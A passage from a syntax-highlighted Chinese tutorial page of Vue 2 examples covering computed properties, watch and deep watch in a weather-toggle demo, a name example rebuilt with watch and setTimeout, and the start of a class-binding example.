<span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">姓名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">firstName:<span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="javascript">lastName:<span class="string">&#x27;三&#x27;</span>,</span></span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//完整写法</span></span></span><br><span class="line">fullName:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//当有人读取fullName属性时，就会调用get()，且返回值作为fullName的属性值</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//get()调用的时机：1.初次读取fullName时。2.所依赖的数据发生改变时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">get</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.firstName+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">this</span>.lastName</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="comment">//set()调用的时机：1.当fullName被修改时时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">set</span>(<span class="params">value</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> arr = value.split(<span class="string">&#x27;-&#x27;</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.firstName = arr[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.lastName = arr[<span class="number">1</span>]</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//简写（如果只有get方法时才可以这样写）</span></span></span><br><span class="line">/*fullName()&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.firstName+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">this</span>.lastName</span></span><br><span class="line">&#125;*/</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="14-天气案例"><a href="#14-天气案例" class="headerlink" title="14.天气案例"></a>14.天气案例</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>天气案例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;！<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;change&quot;</span>&gt;</span>切换天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">isHost: <span class="literal">true</span></span></span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">change</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.isHost = !<span class="built_in">this</span>.isHost</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">info</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.isHost?<span class="string">&#x27;炎热&#x27;</span>:<span class="string">&#x27;凉爽&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="15-监视属性-天气案例"><a href="#15-监视属性-天气案例" class="headerlink" title="15.监视属性-天气案例"></a>15.监视属性-天气案例</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>监视属性-天气案例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">监视属性watch：</span></span><br><span class="line"><span class="comment">1.当被监视的属性发生变化时，handler回调函数会自动调用，执行相关操作；</span></span><br><span class="line"><span class="comment">2.监视的属性必须存在，才能被监视；</span></span><br><span class="line"><span class="comment">3.监视的两种方法：</span></span><br><span class="line"><span class="comment">(1).new Vue时传入watch配置；</span></span><br><span class="line"><span class="comment">(2).通过vm.$watch()监视；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;！<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;change&quot;</span>&gt;</span>切换天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">isHost: <span class="literal">true</span></span></span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">change</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.isHost = !<span class="built_in">this</span>.isHost</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">info</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.isHost?<span class="string">&#x27;炎热&#x27;</span>:<span class="string">&#x27;凉爽&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="comment">//监视属性第一种写法</span></span></span><br><span class="line">/*watch:&#123;//监视</span><br><span class="line"><span class="javascript"><span class="comment">//监视isHost属性</span></span></span><br><span class="line">isHost:&#123;</span><br><span class="line"><span class="javascript">immediate:<span class="literal">true</span>,<span class="comment">//初始化时，让handler函数调用一下。</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//handler什么时候调用？当isHost发生改变时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;isHost发生改变,改变前：&#x27;</span>+oldValue+<span class="string">&#x27;  改变后：&#x27;</span>+newValue)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;*/</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//监视属性第二种写法</span></span></span><br><span class="line"><span class="javascript">vm.$watch(<span class="string">&#x27;isHost&#x27;</span>,&#123;</span></span><br><span class="line"><span class="javascript">immediate:<span class="literal">true</span>,<span class="comment">//初始化时，让handler函数调用一下。</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//handler什么时候调用？当isHost发生改变时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;isHost发生改变,改变前：&#x27;</span>+oldValue+<span class="string">&#x27;  改变后：&#x27;</span>+newValue)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="16-深度监视属性-天气案例"><a href="#16-深度监视属性-天气案例" class="headerlink" title="16.深度监视属性-天气案例"></a>16.深度监视属性-天气案例</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>深度监视属性-天气案例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">深度监视：</span></span><br><span class="line"><span class="comment">1.Vue中的watch默认不监视对象内部值的改变（一层）；</span></span><br><span class="line"><span class="comment">2.配置deep:true可以监视对象内部值的改变（多层）；</span></span><br><span class="line"><span class="comment">备注：</span></span><br><span class="line"><span class="comment">1.Vue自身可以监视对象内部值的改变，但Vue提供的watch默认不可以；</span></span><br><span class="line"><span class="comment">2.使用watch时根据数据的具体结构，决定是否采用深度监视；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;！<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;change&quot;</span>&gt;</span>切换天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>a的值是：&#123;&#123;numbers.a&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers.a++&quot;</span>&gt;</span>点我让a+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>b的值是：&#123;&#123;numbers.b&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers.b++&quot;</span>&gt;</span>点我让b+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">isHost: <span class="literal">true</span>,</span></span><br><span class="line">numbers:&#123;</span><br><span class="line">a:1,</span><br><span class="line">b:2</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">change</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.isHost = !<span class="built_in">this</span>.isHost</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">info</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.isHost?<span class="string">&#x27;炎热&#x27;</span>:<span class="string">&#x27;凉爽&#x27;</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript">watch:&#123;<span class="comment">//监视</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//监视isHost属性的变化</span></span></span><br><span class="line">isHost:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//immediate:true,//初始化时，让handler函数调用一下。</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//handler什么时候调用？当isHost发生改变时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;isHost发生改变,改变前：&#x27;</span>+oldValue+<span class="string">&#x27;  改变后：&#x27;</span>+newValue)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="comment">//监视多级结构中“某个”属性的变化</span></span></span><br><span class="line"><span class="javascript"><span class="comment">/*&#x27;numbers.a&#x27;:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//immediate:true,//初始化时，让handler函数调用一下。</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//handler什么时候调用？当isHost发生改变时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;a发生改变,改变前：&#x27;</span>+oldValue+<span class="string">&#x27;  改变后：&#x27;</span>+newValue)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,*/</span><br><span class="line"><span class="javascript"><span class="comment">//监视多级结构中“所有”属性的变化</span></span></span><br><span class="line">numbers:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//immediate:true,//初始化时，让handler函数调用一下。</span></span></span><br><span class="line"><span class="javascript">deep:<span class="literal">true</span>,<span class="comment">//开启深度监视属性</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">&#x27;numbers发生改变&#x27;</span>)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="17-计算属性—姓名案例（watch监视实现）"><a href="#17-计算属性—姓名案例（watch监视实现）" class="headerlink" title="17.计算属性—姓名案例（watch监视实现）"></a>17.计算属性—姓名案例（watch监视实现）</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>计算属性—姓名案例（watch监视实现）<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">computed和watch之间的区别：</span></span><br><span class="line"><span class="comment">1.computed能实现的功能，watch都能实现；</span></span><br><span class="line"><span class="comment">2.watch能完成的功能，computed不一定能完成（比如：watch可以进行异步操作）</span></span><br><span class="line"><span class="comment">两个重要的小原则：</span></span><br><span class="line"><span class="comment">1.所有被Vue管理的函数，最好写成普通函数，这样this的指向才是vm或者组件实例对象；</span></span><br><span class="line"><span class="comment">2.所有不被Vue管理的函数（定时器回调函数，ajax回调函数等），最好写成箭头函数，这样this的指向才是vm或者组件实例对象；</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">姓：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;firstName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;lastName&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">姓名：<span class="tag">&lt;<span class="name">span</span>&gt;</span>&#123;&#123;fullName&#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止Vue在启动时生成生产提示</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">el:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line">data:&#123;</span><br><span class="line"><span class="javascript">firstName:<span class="string">&#x27;张&#x27;</span>,</span></span><br><span class="line"><span class="javascript">lastName:<span class="string">&#x27;三&#x27;</span>,</span></span><br><span class="line"><span class="javascript">fullName:<span class="string">&#x27;张-三&#x27;</span></span></span><br><span class="line">&#125;,</span><br><span class="line">/*computed:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//完整写法</span></span></span><br><span class="line">fullName:&#123;</span><br><span class="line"><span class="javascript"><span class="comment">//当有人读取fullName属性时，就会调用get()，且返回值作为fullName的属性值</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//get()调用的时机：1.初次读取fullName时。2.所依赖的数据发生改变时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">get</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">return</span> <span class="built_in">this</span>.firstName+<span class="string">&#x27;-&#x27;</span>+<span class="built_in">this</span>.lastName</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="javascript"><span class="comment">//set()调用的时机：1.当fullName被修改时时。</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="title">set</span>(<span class="params">value</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">const</span> arr = value.split(<span class="string">&#x27;-&#x27;</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.firstName = arr[<span class="number">0</span>]</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.lastName = arr[<span class="number">1</span>]</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,*/</span><br><span class="line">watch:&#123;</span><br><span class="line">firstName:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params">newValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="comment">//定时器回调函数,延迟1秒设值</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;<span class="comment">//不是Vue管理的函数，写为箭头函数的this是vm或组件实例对象；</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="built_in">this</span>)</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.fullName = newValue + <span class="string">&#x27;-&#x27;</span> +<span class="built_in">this</span>.lastName</span></span><br><span class="line">&#125;,1000);</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">//setTimeout(function()&#123;//不是Vue管理的函数，写为普通函数的this不是vm或组件实例对象；</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//console.log(this)</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//this.fullName = newValue + &#x27;-&#x27; +this.lastName</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//&#125;,1000);</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">lastName:&#123;</span><br><span class="line"><span class="javascript"><span class="function"><span class="title">handler</span>(<span class="params">newValue</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">this</span>.fullName = <span class="built_in">this</span>.firstName + <span class="string">&#x27;-&#x27;</span> + newValue</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="18-绑定样式"><a href="#18-绑定样式" class="headerlink" title="18.绑定样式"></a>18.绑定样式</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>绑定样式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">.basic&#123;</span><br><span class="line"><span class="css"><span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line">&#125;</span><br><span class="line">.happy&#123;</span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: greenyellow;</span></span><br><span class="line">&#125;</span><br><span class="line">.sad&#123;</span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: <span class="number">#aaaaaa</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">border</span>: <span class="number">5px</span> dotted green;</span></span><br><span class="line">&#125;</span><br><span class="line">.normal&#123;</span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: gold;</span></span><br><span class="line">&#125;</span><br><span class="line">.atguigu1&#123;</span><br><span class="line"><span class="css"><span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">background-color</span>: green;</span></span><br><span class="line"><span class="css"><span class="attribute">border</span>: <span class="number">1px</span> solid black;</span></span><br><span class="line">&#125;</span><br><span class="line">.atguigu2&#123;</span><br><span class="line"><span class="css"><span class="attribute">font-size</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="css"><span class="attribute">font-style</span>: inherit;</span></span><br><span class="line">&#125;</span><br><span class="line">.atguigu3&#123;</span><br><span class="line"><span class="css"><span class="attribute">border-radius</span>: <span class="number">10px</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--绑定class样式--字符串写法，适用于：样式类名不确定，需要动态指定--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span class="string">&quot;mood&quot;</span> @<span class="attr">click</span>=<span class="string">&quot;changeMood&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!--绑定class样式--数组写法，适用于：要绑定的样式个数不确定，名字也不确定--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;basic&quot;</span> <span class="attr">:class</span>=<span 